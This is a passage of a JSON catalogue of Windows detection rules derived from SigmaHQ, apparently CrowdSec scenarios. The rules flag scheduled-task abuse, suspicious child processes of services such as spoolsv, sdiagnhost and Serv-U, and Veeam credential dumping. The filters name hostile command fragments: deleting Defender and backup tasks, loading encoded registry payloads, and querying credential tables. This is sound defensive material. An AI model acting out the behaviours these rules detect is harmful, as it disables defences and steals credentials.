"scenarios/sigmahq/proc_creation_win_schtasks_change.yml", "version": "0.2", "versions": {"0.1": {"digest": "cb90e56164c2220fb96410d1316433c2f2a4a2a5493ccd6474afa21e195658d3"}, "0.2": {"digest": "8f6a0e8277d7045bc59e95174dd7093eca77d8c5fe65b9db2fa7eba18ebc73b2"}}}, "sigmahq/proc_creation_win_schtasks_creation_temp_folder": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_creation_temp_folder\ndescription: |\n  Detects the creation of scheduled tasks that involves a temporary folder and runs only once\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\schtasks.exe' && evt.Parsed.CommandLine contains ' /create ' && evt.Parsed.CommandLine contains ' /sc once ' && evt.Parsed.CommandLine contains '\\\\Temp\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053.005\n\n  label: \"Suspicious Scheduled Task Creation Involving Temp Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the creation of scheduled tasks that involves a temporary folder and runs only once\n", "path": "scenarios/sigmahq/proc_creation_win_schtasks_creation_temp_folder.yml", "version": "0.2", "versions": {"0.1": {"digest": "3c5a434bd07f2198586ec25fbe10c2843151aa15e5766b3a5fe0c17596bebfa1"}, "0.2": {"digest": "dbfddc3dcd1898616b2b11361c98bae00be7879a376149bfbfffc8a65d10609e"}}}, "sigmahq/proc_creation_win_schtasks_delete": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_delete\ndescription: |\n  Detects when adversaries stop services or processes by deleting their respective scheduled tasks in order to conduct data destructive activities\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\schtasks.exe' && evt.Parsed.CommandLine contains '/delete' && evt.Parsed.CommandLine contains '/tn' && (evt.Parsed.CommandLine contains '\\\\Windows\\\\BitLocker' || evt.Parsed.CommandLine contains '\\\\Windows\\\\ExploitGuard' || evt.Parsed.CommandLine contains '\\\\Windows\\\\SystemRestore\\\\SR' || evt.Parsed.CommandLine contains '\\\\Windows\\\\UpdateOrchestrator\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Windows Defender\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\WindowsBackup\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\WindowsUpdate\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1489\n\n  label: \"Delete Important Scheduled Task\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when adversaries stop services or processes by deleting their respective scheduled tasks in order to conduct data destructive activities\n", "path": "scenarios/sigmahq/proc_creation_win_schtasks_delete.yml", "version": "0.2", "versions": {"0.1": {"digest": "88205b374b97749c69229f5265ad82cb950c6cff8bc046ff1d3e65715966ceb1"}, "0.2": {"digest": "b7207ec1955b1d1c79243a24fa7da1286d4be80cfc47801b59e0a9928cec46b3"}}}, "sigmahq/proc_creation_win_schtasks_delete_all": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_delete_all\ndescription: |\n  Detects the usage of schtasks with the delete flag and the asterisk symbol to delete all tasks from the schedule of the local computer, including tasks scheduled by other users.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\schtasks.exe' && evt.Parsed.CommandLine contains ' /delete ' && evt.Parsed.CommandLine contains '/tn *' && evt.Parsed.CommandLine contains ' /f')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1489\n\n  label: \"Delete All Scheduled Tasks\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of schtasks with the delete flag and the asterisk symbol to delete all tasks from the schedule of the local computer, including tasks scheduled by other users.\n", "path": "scenarios/sigmahq/proc_creation_win_schtasks_delete_all.yml", "version": "0.2", "versions": {"0.1": {"digest": "0de3e876f218c1264a6c93556d9b6bb62541bc466c6467c622137ddebefcb91c"}, "0.2": {"digest": "2265f926484a7789b3fca306e40255bfc825e6c9fcbeddc85f029ada6f63f763"}}}, "sigmahq/proc_creation_win_schtasks_disable": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_disable\ndescription: |\n  Detects when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\schtasks.exe' && evt.Parsed.CommandLine contains '/Change' && evt.Parsed.CommandLine contains '/TN' && evt.Parsed.CommandLine contains '/disable' && (evt.Parsed.CommandLine contains '\\\\Windows\\\\BitLocker' || evt.Parsed.CommandLine contains '\\\\Windows\\\\ExploitGuard' || evt.Parsed.CommandLine contains '\\\\Windows\\\\ExploitGuard\\\\ExploitGuard MDM policy Refresh' || evt.Parsed.CommandLine contains '\\\\Windows\\\\SystemRestore\\\\SR' || evt.Parsed.CommandLine contains '\\\\Windows\\\\UpdateOrchestrator\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Windows Defender\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\WindowsBackup\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\WindowsUpdate\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1489\n\n  label: \"Disable Important Scheduled Task\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities\n", "path": "scenarios/sigmahq/proc_creation_win_schtasks_disable.yml", "version": "0.2", "versions": {"0.1": {"digest": "2bbae0c88c7c9ace9b2c8a4b99fa9c09fb2e8b5273cb87be145e7c4dd8c43880"}, "0.2": {"digest": "b611c6a4f17aa8105f4e1bd6e6ab35928b2d5087b36abfe7cc273217e26439e6"}}}, "sigmahq/proc_creation_win_schtasks_folder_combos": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_folder_combos\ndescription: |\n  Detects scheduled task creations that have suspicious action command and folder combinations\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.OriginalFileName == 'schtasks.exe') && evt.Parsed.CommandLine contains ' /create ' && (evt.Parsed.CommandLine contains 'powershell' || evt.Parsed.CommandLine contains 'pwsh' || evt.Parsed.CommandLine contains 'cmd /c ' || evt.Parsed.CommandLine contains 'cmd /k ' || evt.Parsed.CommandLine contains 'cmd /r ' || evt.Parsed.CommandLine contains 'cmd.exe /c ' || evt.Parsed.CommandLine contains 'cmd.exe /k ' || evt.Parsed.CommandLine contains 'cmd.exe /r ') && (evt.Parsed.CommandLine contains 'C:\\\\ProgramData\\\\' || evt.Parsed.CommandLine contains '%ProgramData%'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053.005\n\n  label: \"Schtasks From Suspicious Folders\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects scheduled task creations that have suspicious action command and folder combinations\n", "path": "scenarios/sigmahq/proc_creation_win_schtasks_folder_combos.yml", "version": "0.2", "versions": {"0.1": {"digest": "7e6e4c5fc2ba31d43f2481e011ef4412f2cd6054283828eb58d8b32daf20253f"}, "0.2": {"digest": "f449e7b9998c497d3369a0e76495c70f022538401c0d8ab432d46e2e8e0b9428"}}}, "sigmahq/proc_creation_win_schtasks_one_time_only_midnight_task": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_one_time_only_midnight_task\ndescription: |\n  Detects scheduled task creation events that include suspicious actions, and is run once at 00:00\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image contains '\\\\schtasks.exe' || evt.Parsed.OriginalFileName == 'schtasks.exe') && (evt.Parsed.CommandLine contains 'wscript' || evt.Parsed.CommandLine contains 'vbscript' || evt.Parsed.CommandLine contains 'cscript' || evt.Parsed.CommandLine contains 'wmic ' || evt.Parsed.CommandLine contains 'wmic.exe' || evt.Parsed.CommandLine contains 'regsvr32.exe' || evt.Parsed.CommandLine contains 'powershell' || evt.Parsed.CommandLine contains '\\\\AppData\\\\') && evt.Parsed.CommandLine contains 'once' && evt.Parsed.CommandLine contains '00:00')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053.005\n\n  label: \"Uncommon One Time Only Scheduled Task At 00:00\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects scheduled task creation events that include suspicious actions, and is run once at 00:00\n", "path": "scenarios/sigmahq/proc_creation_win_schtasks_one_time_only_midnight_task.yml", "version": "0.2", "versions": {"0.1": {"digest": "15349db85ec46fea14893521984dfb94484c5ec2a4ddbb3519d62476b798472f"}, "0.2": {"digest": "447110dc7ae3085133df5d135a8db43ac02299b59e68d0338dfbd118cc644056"}}}, "sigmahq/proc_creation_win_schtasks_powershell_persistence": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_powershell_persistence\ndescription: |\n  Detects suspicious powershell execution via a schedule task where the command ends with an suspicious flags to hide the powershell instance instead of executeing scripts or commands. This could be a sign of persistence via PowerShell \"Get-Variable\" technique as seen being used in Colibri Loader\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage == 'C:\\\\WINDOWS\\\\System32\\\\svchost.exe' && evt.Parsed.ParentCommandLine contains '-k netsvcs' && evt.Parsed.ParentCommandLine contains '-s Schedule' && (evt.Parsed.CommandLine endsWith ' -windowstyle hidden' || evt.Parsed.CommandLine endsWith ' -w hidden' || evt.Parsed.CommandLine endsWith ' -ep bypass' || evt.Parsed.CommandLine endsWith ' -noni'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053.005\n   - attack.t1059.001\n\n  label: \"Potential Persistence Via Powershell Search Order Hijacking - Task\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious powershell execution via a schedule task where the command ends with an suspicious flags to hide the powershell instance instead of executeing scripts or commands. This could be a sign of persistence via PowerShell \"Get-Variable\" technique as seen being used in Colibri Loader\n", "path": "scenarios/sigmahq/proc_creation_win_schtasks_powershell_persistence.yml", "version": "0.2", "versions": {"0.1": {"digest": "e57295b40ef41b7f2b6d119beeefe716e2cac0dccad98c6fadef628ddb059f1a"}, "0.2": {"digest": "c43d0a53f560ceb826a15809b90bd77f1b9cfce142854ed707430397db0f02fd"}}}, "sigmahq/proc_creation_win_schtasks_reg_loader_encoded": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_reg_loader_encoded\ndescription: |\n  Detects the creation of a schtask that potentially executes a base64 encoded payload stored in the Windows Registry using PowerShell.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.OriginalFileName == 'schtasks.exe') && evt.Parsed.CommandLine contains '/Create' && (evt.Parsed.CommandLine contains 'FromBase64String' || evt.Parsed.CommandLine contains 'encodedcommand') && (evt.Parsed.CommandLine contains 'Get-ItemProperty' || evt.Parsed.CommandLine contains ' gp ') && (evt.Parsed.CommandLine contains 'HKCU:' || evt.Parsed.CommandLine contains 'HKLM:' || evt.Parsed.CommandLine contains 'registry::' || evt.Parsed.CommandLine contains 'HKEY_'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053.005\n   - attack.t1059.001\n\n  label: \"Scheduled Task Executing Encoded Payload from Registry\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the creation of a schtask that potentially executes a base64 encoded payload stored in the Windows Registry using PowerShell.\n", "path": "scenarios/sigmahq/proc_creation_win_schtasks_reg_loader_encoded.yml", "version": "0.2", "versions": {"0.1": {"digest": "a57e519ca4cb8a3da5a49f7e55316390bd8738b3b49e0ea885203086dd2fe908"}, "0.2": {"digest": "66f39e17639a12ed8e8ad5cdd7925e67cffbee0da6fe1bd16d59582a45ae2b4c"}}}, "sigmahq/proc_creation_win_schtasks_schedule_type": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_schedule_type\ndescription: |\n  Detects scheduled task creations or modification on a suspicious schedule type\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.OriginalFileName == 'schtasks.exe') && (evt.Parsed.CommandLine contains ' ONLOGON ' || evt.Parsed.CommandLine contains ' ONSTART ' || evt.Parsed.CommandLine contains ' ONCE ' || evt.Parsed.CommandLine contains ' ONIDLE ') && not (evt.Parsed.CommandLine contains 'NT AUT' || evt.Parsed.CommandLine contains ' SYSTEM' || evt.Parsed.CommandLine contains 'HIGHEST'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053.005\n\n  label: \"Suspicious Schtasks Schedule Types\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects scheduled task creations or modification on a suspicious schedule type\n", "path": "scenarios/sigmahq/proc_creation_win_schtasks_schedule_type.yml", "version": "0.2", "versions": {"0.1": {"digest": "c8818d3e0481817e86f3963daff73ac56f56978f39db28de54e8948f5ad8eed5"}, "0.2": {"digest": "c8e129b77bea2b94e66c42c52871b6b175430e7faf4936d9eaa9a317a4eb3c63"}}}, "sigmahq/proc_creation_win_schtasks_system": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_system\ndescription: |\n  Detects the creation or update of a scheduled task to run with \"NT AUTHORITY\\SYSTEM\" privileges\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\schtasks.exe' && (evt.Parsed.CommandLine contains ' /change ' || evt.Parsed.CommandLine contains ' /create ') && evt.Parsed.CommandLine contains '/ru ' && (evt.Parsed.CommandLine contains 'NT AUT' || evt.Parsed.CommandLine contains ' SYSTEM ') && not (evt.Parsed.Image endsWith '\\\\schtasks.exe' && evt.Parsed.CommandLine contains '/TN TVInstallRestore' && evt.Parsed.CommandLine contains '\\\\TeamViewer_.exe' || evt.Parsed.CommandLine contains '/Create /F /RU System /SC WEEKLY /TN AviraSystemSpeedupVerify /TR ' || evt.Parsed.CommandLine contains ':\\\\Program Files (x86)\\\\Avira\\\\System Speedup\\\\setup\\\\avira_speedup_setup.exe' || evt.Parsed.CommandLine contains '/VERIFY /VERYSILENT /NOSTART /NODOTNET /NORESTART\" /RL HIGHEST'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053.005\n\n  label: \"Schtasks Creation Or Modification With SYSTEM Privileges\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the creation or update of a scheduled task to run with \"NT AUTHORITY\\SYSTEM\" privileges\n", "path": "scenarios/sigmahq/proc_creation_win_schtasks_system.yml", "version": "0.2", "versions": {"0.1": {"digest": "e95f29f0b1575e0a403f1c3969008347f5a9df1b8e0d142be18a5c5a16daba30"}, "0.2": {"digest": "5ae8f060b09ba8da95c1383ddc08634004ccd608317ca2fcb717d541562906ab"}}}, "sigmahq/proc_creation_win_scrcons_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_scrcons_susp_child_process\ndescription: |\n  Detects a suspicious child process of Script Event Consumer (scrcons.exe).\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\scrcons.exe' && (evt.Parsed.Image endsWith '\\\\svchost.exe' || evt.Parsed.Image endsWith '\\\\dllhost.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\msiexec.exe' || evt.Parsed.Image endsWith '\\\\msbuild.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1047\n\n  label: \"Script Event Consumer Spawning Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious child process of Script Event Consumer (scrcons.exe).\n", "path": "scenarios/sigmahq/proc_creation_win_scrcons_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "d9610eb8ac88ba3be8044fda3e67ca3f3073f91b9a50ff74d9ccc2d1f2e8c182"}, "0.2": {"digest": "fa9fde53d50a2ed44dbc8ea9f9a0c253f6f71945f16f29ca1108500e96931cd3"}}}, "sigmahq/proc_creation_win_sdiagnhost_susp_child": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sdiagnhost_susp_child\ndescription: |\n  Detects sdiagnhost.exe calling a suspicious child process (e.g. used in exploits for Follina / CVE-2022-30190)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\sdiagnhost.exe' && (evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\taskkill.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\calc.exe') && not (evt.Parsed.Image endsWith '\\\\cmd.exe' && evt.Parsed.CommandLine contains 'bits' || evt.Parsed.Image endsWith '\\\\powershell.exe' && (evt.Parsed.CommandLine endsWith '-noprofile -' || evt.Parsed.CommandLine endsWith '-noprofile')))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n   - attack.t1218\n\n  label: \"Sdiagnhost Calling Suspicious Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects sdiagnhost.exe calling a suspicious child process (e.g. used in exploits for Follina / CVE-2022-30190)\n", "path": "scenarios/sigmahq/proc_creation_win_sdiagnhost_susp_child.yml", "version": "0.2", "versions": {"0.1": {"digest": "56527f49583f88a166bce9995ef37cdbf08138caefda06ce86af6ca8e667480c"}, "0.2": {"digest": "0122b8cf97c48b57a755531b47262bd413f600527ae7806b6d16bc3d18fe54d0"}}}, "sigmahq/proc_creation_win_servu_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_servu_susp_child_process\ndescription: |\n  Detects a suspicious process pattern which could be a sign of an exploited Serv-U service\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\Serv-U.exe' && (evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\sh.exe' || evt.Parsed.Image endsWith '\\\\bash.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\msiexec.exe' || evt.Parsed.Image endsWith '\\\\forfiles.exe' || evt.Parsed.Image endsWith '\\\\scriptrunner.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1555\n\n  label: \"Suspicious Serv-U Process Pattern\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious process pattern which could be a sign of an exploited Serv-U service\n", "path": "scenarios/sigmahq/proc_creation_win_servu_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "f9233cf41bbc3279a8919aab4c99897539d1c84634cf5f8060a5945beee9f649"}, "0.2": {"digest": "c166175f19aa91cd1035a8dd154ed3776c14196a5bd0550287cdc6a9604fc16f"}}}, "sigmahq/proc_creation_win_setres_uncommon_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_setres_uncommon_child_process\ndescription: |\n  Detects uncommon child process of Setres.EXE. Setres.EXE is a Windows server only process and tool that can be used to set the screen resolution. It can potentially be abused in order to launch any arbitrary file with a name containing the word \"choice\" from the current execution path. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\setres.exe' && evt.Parsed.Image contains '\\\\choice' && not (evt.Parsed.Image endsWith 'C:\\\\Windows\\\\System32\\\\choice.exe' || evt.Parsed.Image endsWith 'C:\\\\Windows\\\\SysWOW64\\\\choice.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n   - attack.t1202\n\n  label: \"Uncommon Child Process Of Setres.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects uncommon child process of Setres.EXE. Setres.EXE is a Windows server only process and tool that can be used to set the screen resolution. It can potentially be abused in order to launch any arbitrary file with a name containing the word \"choice\" from the current execution path. \n", "path": "scenarios/sigmahq/proc_creation_win_setres_uncommon_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "69ed19c4fab60858b4132d6aef5732492338d691a3f1ddf5c64868e7c61d85d0"}, "0.2": {"digest": "170372095b6343ad3006c47a02200d29353184147f989f86a07514aa0d376e8f"}}}, "sigmahq/proc_creation_win_splwow64_cli_anomaly": {"content": "type: trigger\nname: sigmahq/proc_creation_win_splwow64_cli_anomaly\ndescription: |\n  Detects suspicious Splwow64.exe process without any command line parameters\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\splwow64.exe' && evt.Parsed.CommandLine endsWith 'splwow64.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1202\n\n  label: \"Suspicious Splwow64 Without Params\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious Splwow64.exe process without any command line parameters\n", "path": "scenarios/sigmahq/proc_creation_win_splwow64_cli_anomaly.yml", "version": "0.2", "versions": {"0.1": {"digest": "7aea8340832b7b3d70a1c7c92c12a6712bc257a456bde947221735604e50b14b"}, "0.2": {"digest": "ad6328899664c8f73be4c783b6aa8eb1ab08750c5dc3bdea68e23fb6e67ecd07"}}}, "sigmahq/proc_creation_win_spoolsv_susp_child_processes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_spoolsv_susp_child_processes\ndescription: |\n  Detects suspicious print spool service (spoolsv.exe) child processes.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\spoolsv.exe' && evt.Parsed.IntegrityLevel == 'System' && (evt.Parsed.Image endsWith '\\\\gpupdate.exe' || evt.Parsed.Image endsWith '\\\\whoami.exe' || evt.Parsed.Image endsWith '\\\\nltest.exe' || evt.Parsed.Image endsWith '\\\\taskkill.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe' || evt.Parsed.Image endsWith '\\\\taskmgr.exe' || evt.Parsed.Image endsWith '\\\\sc.exe' || evt.Parsed.Image endsWith '\\\\findstr.exe' || evt.Parsed.Image endsWith '\\\\curl.exe' || evt.Parsed.Image endsWith '\\\\wget.exe' || evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.Image endsWith '\\\\accesschk.exe' || evt.Parsed.Image endsWith '\\\\wevtutil.exe' || evt.Parsed.Image endsWith '\\\\bcdedit.exe' || evt.Parsed.Image endsWith '\\\\fsutil.exe' || evt.Parsed.Image endsWith '\\\\cipher.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\write.exe' || evt.Parsed.Image endsWith '\\\\wuauclt.exe' || evt.Parsed.Image endsWith '\\\\systeminfo.exe' || evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.Image endsWith '\\\\query.exe' || (evt.Parsed.Image endsWith '\\\\net.exe' || evt.Parsed.Image endsWith '\\\\net1.exe') && not (evt.Parsed.CommandLine contains 'start') || evt.Parsed.Image endsWith '\\\\cmd.exe' && not (evt.Parsed.CommandLine contains '.spl' || evt.Parsed.CommandLine contains 'route add' || evt.Parsed.CommandLine contains 'program files') || evt.Parsed.Image endsWith '\\\\netsh.exe' && not (evt.Parsed.CommandLine contains 'add portopening' || evt.Parsed.CommandLine contains 'rule name') || (evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && not (evt.Parsed.CommandLine contains '.spl') || (evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.EXE') && evt.Parsed.CommandLine endsWith 'rundll32.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1203\n   - attack.t1068\n\n  label: \"Suspicious Spool Service Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious print spool service (spoolsv.exe) child processes.\n", "path": "scenarios/sigmahq/proc_creation_win_spoolsv_susp_child_processes.yml", "version": "0.2", "versions": {"0.1": {"digest": "0b85de4dbc3fd82d2c5b371ea8bc6fa7d3f5282903d7a619c57bed66b5ea2a1f"}, "0.2": {"digest": "8200ac7510e03f3125c3e0a514812ea257c027305c4eb68d62759a75309c1836"}}}, "sigmahq/proc_creation_win_sqlcmd_veeam_dump": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sqlcmd_veeam_dump\ndescription: |\n  Detects dump of credentials in VeeamBackup dbo\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\sqlcmd.exe' && evt.Parsed.CommandLine contains 'SELECT' && evt.Parsed.CommandLine contains 'TOP' && evt.Parsed.CommandLine contains '[VeeamBackup].[dbo].[Credentials]')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1005\n\n  label: \"VeeamBackup Database Credentials Dump Via Sqlcmd.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects dump of credentials in VeeamBackup dbo\n", "path": "scenarios/sigmahq/proc_creation_win_sqlcmd_veeam_dump.yml", "version": "0.2", "versions": {"0.1": {"digest": "b02bb755a512b31fa5532ac528c3f43b280fcbff0f1ea804dd8804284f7c19df"}, "0.2": {"digest": "1bcb03068db8651c47cae4a93b9bb1669e681b725b3d91e9388086f9b1a5c549"}}}, "sigmahq/proc_creation_win_sqlite_chromium_profile_data": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sqlite_chromium_profile_data\ndescription: |\n  Detect usage of the \"sqlite\" binary to query databases in Chromium-based browsers for potential data stealing.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Product == 'SQLite' || evt.Parsed.Image endsWith '\\\\sqlite.exe' || evt.Parsed.Image endsWith '\\\\sqlite3.exe') && (evt.Parsed.CommandLine contains '\\\\User Data\\\\' || evt.Parsed.CommandLine contains 